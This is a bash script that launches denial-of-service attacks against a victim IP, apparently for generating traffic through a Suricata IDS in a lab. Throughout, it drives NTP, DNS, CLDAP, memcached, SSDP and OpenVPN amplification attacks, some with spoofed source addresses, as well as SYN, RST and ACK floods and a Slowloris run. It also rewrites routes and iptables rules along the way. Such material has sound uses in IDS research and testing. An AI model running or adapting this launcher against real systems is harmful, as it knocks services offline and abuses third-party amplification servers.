#!/bin/bash

RED='\033[0;31m' # RED Color
NC='\033[0m' # No Color


before_attack() {
    #
    # Do stuff before each attack
    #
    echo "Attacker commands will be run on: $( uname -a )"
    echo "They are executed by: $( whoami )"
    iptables -A OUTPUT
}

attack_response() {
    #
    # Perform attack which generate response
    #
    case "$ATTACK_VECTOR" in
        "ntp")
            pushd /root/ddos_scripts/ntpdos
            perl ntp_attack_prl.pl $AMP_SERVER_IP $VICTIM_IP $LOOPS
            popd
            ;;
        "openvpn")
            local tmp_dir
            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/openvpn
            tmp_dir=`mktemp -d -p $(pwd)`
            for i in {1..9}; do
            bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir &
            sleep 0.5
            done
            bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir
            rm -r $tmp_dir
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        "dns")
            local target_port=3500
            local number_of_threads=1

            pushd /root/ddos_scripts/dns
            make 2>/dev/null
            ./dns $VICTIM_IP $target_port actual_list.txt $number_of_threads $LOOPS
            make clean
            popd
            ;;
        "cldap")
            local target_port=3500
            local number_of_threads=2
            local pps_limit=2

            pushd /root/ddos_scripts/cldap
            make
            ./ldap $VICTIM_IP $target_port servers.txt $number_of_threads $pps_limit $LOOPS
            make clean
            popd
            ;;
        "memcached")
            local target_port=3500
            local number_of_threads=2
            local pps_limit=300
            pushd /root/ddos_scripts/memcache
            make
            echo $AMP_SERVER_IP > local_server.txt
            ./mem_cache_c $VICTIM_IP $target_port local_server.txt $number_of_threads $pps_limit $LOOPS
            make clean
            popd
            ;;
        "ssdp")
            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/ssdp
            bash replay_ssdp_response.sh $VICTIM_IP $LOOPS
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        *)
            echo -e "${RED}Wrong attack vector argument!${NC}"
            exit 1
            ;;
    esac
}

attack_querry() {
    #
    # Perform attack which generate querries
    #
    case "$ATTACK_VECTOR" in
        "ntp")
            local random_ip="98.78.65.43"

            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/ntpdos
            perl ntp_attack_prl.pl $VICTIM_IP $random_ip $LOOPS
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        "openvpn")
            local tmp_dir

            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/openvpn
            tmp_dir=`mktemp -d -p $(pwd)`
            for i in {1..9}; do
            bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR &
            done
            bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR
            rm -r $tmp_dir
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        "dns")
            local random_ip="98.78.65.43"
            local target_port=3500
            local number_of_threads=1

            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/dns
            make 2>/dev/null
            echo $VICTIM_IP > local_server.txt
            ./dns $random_ip $target_port local_server.txt $number_of_threads $LOOPS
            make clean
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        "cldap")
            local random_ip="98.78.65.43"
            local target_port=3500
            local number_of_threads=2
            local pps_limit=2

            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/cldap
            echo $VICTIM_IP > local_server.txt
            make
            ./ldap $random_ip $target_port local_server.txt $number_of_threads $pps_limit $LOOPS
            make clean
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        "memcached")
            local random_ip="98.76.65.43"
            local target_port=3500
            local number_of_threads=2
            local pps_limit=300

            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/memcache
            make
            echo $VICTIM_IP > local_server.txt
            ./mem_cache_c $random_ip $target_port local_server.txt $number_of_threads $pps_limit $LOOPS
            make clean
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        "ssdp")
            ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/ssdp
            bash replay_ssdp_querry.sh $VICTIM_IP $LOOPS
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            ;;
        *)
            echo -e "${RED}Wrong attack vector argument!${NC}"
            exit 1
            ;;
    esac
}

attack_flood() {
    #
    # Perfrorm flood attack
    #
    local script

    case "$ATTACK_VECTOR" in
        "flood-syn")
            script="my_syn_flood.sh" ;;
        "flood-rst")
            script="my_rst_flood.sh" ;;
        "flood-ack")
            script="my_ack_flood.sh" ;;
        "floods")
            #TODO need to run all of them in paralel
            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
            pushd /root/ddos_scripts/floods
            bash my_ack_flood.sh $VICTIM_IP $LOOPS &
            bash my_rst_flood.sh $VICTIM_IP $LOOPS &
            bash my_syn_flood.sh $VICTIM_IP $LOOPS
            popd
            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
            return 0
            ;;
        *)
            echo -e "${RED}Wrong attack vector argument!${NC}"
            exit 1
            ;;
    esac

    /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
    pushd /root/ddos_scripts/floods
    bash $script $VICTIM_IP $LOOPS
    popd
    /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
}

attack_slow() {
    #
    # Slowloris attack using slowhttptest utility
    #
    local number_of_connections=300
    local interval_between_messages=10
    local connections_per_second=200
    local length_of_data=10

    /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
    slowhttptest -c $number_of_connections -H -i $interval_between_messages -l $LOOPS \
        -r $connections_per_second -t GET -u "http://$VICTIM_IP" -x $length_of_data
    /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
}


after_attack() {
    #
    # Do situff after each attack
    #

    # Make sure that all packets arrive to the destination
    echo 'Waiting 3 seconds for packets to arrive to host...'
    sleep 3
    iptables -vnL OUTPUT; iptables -F;iptables -X
}



#### MAIN

before_attack

case "$ATTACK_TYPE" in
    "response")
        attack_response ;;
    "querry")
        attack_querry   ;;
    "flood")
        attack_flood    ;;
    "slow")
        attack_slow     ;;
    *)
        echo -e "${RED}Wrong attack type argument!${NC}"
        exit 1
        ;;
esac

after_attack
